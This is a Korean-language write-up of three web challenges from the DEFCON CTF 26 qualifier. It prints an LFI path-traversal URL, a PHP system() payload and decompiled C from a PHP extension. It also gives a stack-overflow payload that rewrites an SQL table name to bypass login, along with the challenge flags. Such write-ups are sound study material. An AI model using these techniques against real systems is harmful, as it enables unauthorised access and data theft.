# DEFCON CTF 26 Quals 

## Introduce

주최가 **Order of the Overflow**로 바뀌고 난 뒤 처음으로 열린 DEFCON CTF Quals.

하지만 웹 문제는 웹이라는 카테고리를 달고 있는 리버싱, 포너블..(?)

잘하시는 분들이랑 대회를 같이 해보니 정말 재밌었고, 배울 것 또한 많았다.

더욱 공부해서 본선에서 도움이 되도록 해야겠다..!

## Writeup

### - You Already Know

>You already know the answer here.
>
>**Seriously**, *if you can read this*, you already have the flag.

패킷 잘 보면 플래그가 있다.

```json
{
  "success": true, 
  "message": "Stop overthinking it, you already know the answer here.\n\n[comment]: <> (OOO{Sometimes, the answer is just staring you in the face. We have all been there})\n\nYou already have the flag.\n\n**Seriously**, _if you can read this_, then you have the flag.\n\nSubmit it!\n"
}
```

FLAG : OOO{Sometimes, the answer is just staring you in the face. We have all been there}

### - PHP Eval White-List

> PHP was dangerous, so we've fixed it! 
>
> http://c67f8ffd.quals2018.oooverflow.io 
>
> Files:websec_eval_wl.so

음... 뭔가 화이트리스트로 PHP Eval을 이용해 플래그를 얻는 문제인 것 같다.

근데 이유는 모르겠지만 `ehco system('../flag');` 만으로 플래그가 나와버렸다.

FLAG : OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}

### - exzendtential-crisis

 로그인 후 글을 작성하고 작성한 글에 접근하면 다음의 페이지에 접근이 가능하다.

`http://d4a386ad.quals2018.oooverflow.io/essays.php?preview&name=~~~~`

name파라미터를 통해 LFI공격이 가능했다.

이를 이용해 페이지의 소스를 추출하였다.(flag.php의 경우 필터링에 의해 추출이 불가능하였다.) 

essays.php의 소스 중 중요한 부분은 다음과 같다.

```php
if (isset($_GET['preview']))
{
   $dirname = "upload/${_SESSION['userid']}/";
   $fname = $_GET['name'];

   if (check_fname($fname) === False)
   {
      header("Location: /essays.php");
      exit();
   }
   $content = file_get_contents($dirname . $fname, False, NULL, 0, 524288);
   echo "<h1>Your essay submission</h1>";
   echo "<pre>";
   echo $content;
   echo "</pre>";
   echo "<br>";
   echo "<a href='essays.php'>back</a>";
   exit();
}

function check_fname($fname)
{
   $bad = ["flag", "proc", "dev", "sys", "\x90"];
   foreach ($bad as $b)
   {
      if (strpos($fname, $b) !== false)
      {
         return False;
      }
   }
   return True;
}
```

flag,proc,dev,sys,\x90이 필터링 되는 것을 확인할 수 있다.

우선 문제 카테고리가 `web` ,`pwn` 인걸로 봐서 so파일을 로드할 것이 분명하다.

login.php소스를 보면 다음과 같은 부분이 있다.

```php
<?php

session_start();

if (isset($_GET['source']))
{
   show_source(__FILE__);
   exit();
}

if (isset($_POST['username']) && isset($_POST['password']))
{
   $userid = check_credentials(str_replace("'", "''", $_POST['username']), str_replace("'", "''", $_POST['password']),
                               function ($to_check, $extra_checks) {
                                  $extra_checks($to_check);
                                  $result = get_result();
                                  if ($result === 0)
                                  {
                                     if (strpos($to_check, '%n') !== false)
                                     {
                                        return 1;
                                     }
                                     if (strpos($to_check, '\x90') !== false)
                                     {
                                        return 1;
                                     }
                                     if (strpos($to_check, 'script') !== false)
                                     {
                                        return 1;
                                     }
                                     return 0;
                                  }
                                  else
                                  {
                                     return $result;
                                  }
                               });
   if ($userid)
   {
      $_SESSION['userid'] = $userid;
      header("Location: /index.php");
      exit();
   }
   else
   {
      echo "Invalid login";
   }
}</pre>
```

include하는 파일은 없고, 또한 php기본 함수도 아닌 `check_credentials`를 호출하는 것을 볼 수 있다.

이는 분명히 so를 통해 호출할 것이므로, LFI를 통해 php설정 파일을 열람하였고 맨 아랫 부분에서 로드하는 파일을 확인할 수 있었다.

```
extension=mydb.so
```

mydb.so를 LFI를 통해 다운로드 받아보았다.

`http://d4a386ad.quals2018.oooverflow.io/essays.php?preview&name=../../../../../../../../../usr/lib/php/20151012/mydb.so`

추출한 mydb.so파일에서 `check_credentials` 함수를 찾을 수 있었다.

```c
Php::Value *__fastcall check_credentials(Php::Value *this, _QWORD *a2)
{
  ...
  v4 = j_get_user_id((__int64)vars0, (__int64)vars20, (__int64)check_hacking_attempt);
  Php::Value::operator=(&unk_207100, 0LL);
  if ( v4 == -2 )
  {
    Php::Value::Value(this, 0);
  }
  else
  {
    if ( v4 <= 0 )
      goto LABEL_13;
    Php::Value::Value(this, v4);
  }
  if ( vars20 != &_30 )
    operator delete(vars20);
  if ( vars0 != &vars0 )
    operator delete(vars0);
  result = this;
  if ( __readfsqword(0x28u) != varsA8 )
  {
LABEL_13:
    v6 = (_QWORD *)_cxa_allocate_exception(40LL);
    start(&vars80, "Error in checking credentials.");
    *v6 = &`vtable for'Php::Exception + 2;
    v6[1] = v6 + 3;
    if ( vars80 == &vars90 )
    {
      v7 = vars98;
      v6[3] = vars90;
      v6[4] = v7;
    }
    else
    {
      v6[1] = vars80;
      v6[3] = vars90;
    }
    v6[2] = vars88;
    _cxa_throw(v6, &`typeinfo for'Php::Exception, Php::Exception::~Exception);
  }
  return result;
}
```

위 코드에서 취약점이 발생하는 아래의 코드에서 callback함수인 `check_hacking_attempt`에서 발생한다.

```c
 v4 = j_get_user_id((int64)vars0, (int64)vars20, (__int64)check_hacking_attempt); Php::Value::operator=(&unk_207100, 0LL);
```

 `j_get_user_id` 를 타고 들어가면 callback함수를 `&v4, username`으로 호출하는 것을 확인할 수 있다.

```c
signed __int64 __fastcall get_user_id(__int64 username, __int64 password, unsigned int (__fastcall *callback)(char *, __int64))
{
  char this; // [rsp+30h] [rbp-220h]
  char table[6]; // [rsp+A0h] [rbp-1B0h]
  char s; // [rsp+110h] [rbp-140h]
  unsigned __int64 __canary__; // [rsp+248h] [rbp-8h]

  __canary__ = __readfsqword(0x28u);
  dword_2071A0 = 0xFFFFFFFE;
  strcpy(table, "users");
  if ( callback(&this, username) == 1 )
    return 0xFFFFFFFELL;
  snprintf(&s, 0x131uLL, "select rowid from %s where username = '%s' and password = '%s';", table, username, password);
  sub_51A0(&s, sub_4DD9);
  return (unsigned int)dword_2071A0;
}
```

callback함수인 `check_hacking_attempt`를 분석해보자.

```c
__int64 __fastcall check_hacking_attempt(char *this, char *uesrname)
{
  ...
  v3 = strlen(uesrname);
  if ( v3 <= 0x95 )
  {
    v5 = v3 + 1;
    if ( v5 >= 8 )
    {
      *(_QWORD *)this = *(_QWORD *)uesrname;
      *(_QWORD *)&this[v5 - 8] = *(_QWORD *)&uesrname[v5 - 8];
      qmemcpy(
        (void *)((unsigned __int64)(this + 8) & 0xFFFFFFFFFFFFFFF8LL),
        (const void *)(uesrname - &this[-((unsigned __int64)(this + 8) & 0xFFFFFFFFFFFFFFF8LL)]),
        8LL * ((v5 + (_DWORD)this - (((_DWORD)this + 8) & 0xFFFFFFF8)) >> 3));
    }
    else if ( v5 & 4 )
    {
      *(_DWORD *)this = *(_DWORD *)uesrname;
      *(_DWORD *)&this[v5 - 4] = *(_DWORD *)&uesrname[v5 - 4];
    }
    else if ( v5 )
    {
      *this = *uesrname;
      if ( v5 & 2 )
        *(_WORD *)&this[v5 - 2] = *(_WORD *)&uesrname[v5 - 2];
    }
    ...
  }
  return v2;
}
```

여기서 보면 username이 0x95보다 작을 때 그 값을 첫번째 인자값에 덮어쓰게 된다.

하지만 `get_user_id` 함수에서 정의된 `check_hacking_attempt`의 첫번 째 인자는 크기가 0x70이고 그 다음에 users의 값이 들어간 변수가 오는 것을 확인할 수 있다.

```c
signed __int64 __fastcall get_user_id(__int64 username, __int64 password, unsigned int (__fastcall *callback)(char *, __int64))
{
    ...
    char this; // [rsp+30h] [rbp-220h]
    char table[6]; // [rsp+A0h] [rbp-1B0h]
    strcpy(table, "users");
    if ( callback(&this, username) == 1 )
    ...
}
```

즉 우리는 `username`의 값에 `dummy[0x70]+Query`를 삽입하면  `SQL Injection`이 발생하는 것을 알 수 있다.

```c
snprintf(&s, 0x131uLL, "select rowid from %s where username = '%s' and password = '%s';", table, username, password);
```

최종적으로 완성된 공격 쿼리는 다음과 같다.

```
'A'*0x70 + 'users where rowid=1 -- %00'
```

이를 username에 넣어주면 로그인되어 플래그를 얻을 수 있다.

FLAG : ooo{IMHO, Hell is other people AND other people’s code}